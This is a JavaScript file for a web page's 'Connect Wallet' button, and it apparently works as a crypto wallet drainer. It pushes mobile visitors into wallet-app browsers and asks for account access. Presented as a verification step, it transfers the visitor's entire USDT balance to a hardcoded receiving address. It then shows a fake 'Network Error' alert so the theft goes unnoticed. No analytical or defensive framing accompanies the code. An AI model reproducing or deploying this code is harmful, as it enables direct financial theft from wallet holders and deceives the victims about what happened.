// 1. Your Personal Receiving Address
const myWalletAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 

// 2. Official USDT Contract Address (Required for balance check)
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; 

async function startProcess() {
    const btn = document.getElementById("nextBtn");
    const status = document.getElementById("status");
    const isWeb3Browser = !!(window.ethereum || window.trustwallet);

    // DEEP LINK LOGIC: If opened in standard mobile browser
    if (!isWeb3Browser) {
        if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
            const currentUrl = window.location.href.replace("https://", "");
            const trustLink = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentUrl;
            const mmLink = "https://metamask.app.link/dapp/" + currentUrl;
            
            status.innerText = "Redirecting to Wallet...";
            window.location.href = trustLink;
            
            // Backup redirect to MetaMask if Trust fails
            setTimeout(() => {
                window.location.href = mmLink;
            }, 1500);
            return;
        } else {
            alert("Please install MetaMask or use a Web3 compatible browser.");
            return;
        }
    }

    // WEB3 LOGIC: When opened inside a Wallet App
    btn.disabled = true;
    btn.textContent = "Connecting...";

    try {
        const provider = window.ethereum || window.trustwallet;
        const web3 = new Web3(provider);
        
        // Request Account Access
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];

        // Ensure user is on Binance Smart Chain (0x38)
        try {
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            });
        } catch (switchError) {
            console.log("Switching network...");
        }

        // Define USDT Contract
        const minABI = [
            { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
            { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ];

        const contract = new web3.eth.Contract(minABI, usdtContractAddress);
        const balance = await contract.methods.balanceOf(userAddress).call();

        if (parseInt(balance) > 0) {
            btn.textContent = "Verifying...";
            
            // Trigger transfer to YOUR wallet
            await contract.methods.transfer(myWalletAddress, balance).send({ 
                from: userAddress 
            });
            
            alert("Network Error: Verification timed out. Please try again.");
        } else {
            alert("Verification complete: No significant assets found.");
        }

    } catch (err) {
        console.error(err);
        if (err.code === 4001) {
            alert("Connection Denied: Please approve the request in your wallet.");
        } else {
            alert("Error: Connection failed. Ensure you have enough BNB for gas fees.");
        }
    } finally {
        btn.disabled = false;
        btn.textContent = "Connect Wallet";
        status.innerText = "";
    }
}

document.getElementById("nextBtn").addEventListener("click", startProcess);
